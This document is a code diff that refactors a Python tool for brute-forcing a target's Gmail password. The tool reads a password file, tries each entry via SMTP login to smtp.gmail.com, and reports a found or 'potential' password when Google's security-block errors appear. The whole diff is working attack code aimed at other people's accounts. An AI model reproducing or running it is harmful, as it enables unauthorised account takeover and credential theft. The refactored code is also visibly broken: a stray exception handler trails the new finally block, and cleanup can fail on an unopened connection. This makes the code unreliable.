@@ -41,46 +41,48 @@ def login():
     
     option = input('==>')
     
-    if option == '1':
-        file_path = input('path of passwords file : ')
-        user_name = input('target email : ')
-        
-        try:
-            pass_file = open(file_path, 'r', encoding='utf-8')
+    if option != '1':
+        system('clear')
+        sys.exit()
+    
+    file_path = input('path of passwords file : ')
+    user_name = input('target email : ')
+    
+    # Use context managers for file handling
+    try:
+        with open(file_path, 'r', encoding='utf-8') as pass_file:
             pass_list = pass_file.readlines()
-            pass_file.close()
-        except FileNotFoundError:
-            print(f"[!] File not found: {file_path}")
-            return
+    except FileNotFoundError:
+        print(f"[!] File not found: {file_path}")
+        return
+    
+    # Separate the attack logic into its own function
+    attempt_login(user_name, pass_list)
 
-        try:
-            # Connecting to Gmail SMTP server
-            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
-            server.ehlo()
+def attempt_login(user_name, pass_list):
+    """Attempt login with password list."""
+    try:
+        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
+        server.ehlo()
+        
+        for i, password in enumerate(pass_list, 1):
+            password = password.strip()
+            print(f"{i}/{len(pass_list)} | Testing: {password}")
             
-            i = 0
-            for password in pass_list:
-                i = i + 1
-                password = password.strip()
-                print(f"{i}/{len(pass_list)} | Testing: {password}")
-                
-                try:
-                    server.login(user_name, password)
-                    system('clear')
-                    main_banner()
-                    print('\n')
-                    print(f'[+] Success! Password found: {password}')
+            try:
+                server.login(user_name, password)
+                system('clear')
+                main_banner()
+                print(f'[+] Success! Password found: {password}')
+                break
+            except smtplib.SMTPAuthenticationError as e:
+                if any(block in str(e) for block in ["Application-specific", "AcceptHelp"]):
+                    print(f'[+] Potential password found: {password} (Security block detected)')
                     break
-                except smtplib.SMTPAuthenticationError as e:
-                    error = str(e)
-                    # Checking if the login was actually blocked or if it's just a wrong password
-                    if "Application-specific password required" in error or "AcceptHelp" in error:
-                        print(f'[+] Potential password found: {password} (Security block detected)')
-                        break
-                    else:
-                        continue
-            
-            server.quit()
+    except Exception as e:
+        print(f"[!] Connection error: {e}")
+    finally:
+        server.quit()
         except Exception as e:
             print(f"[!] Connection error: {e}")
             
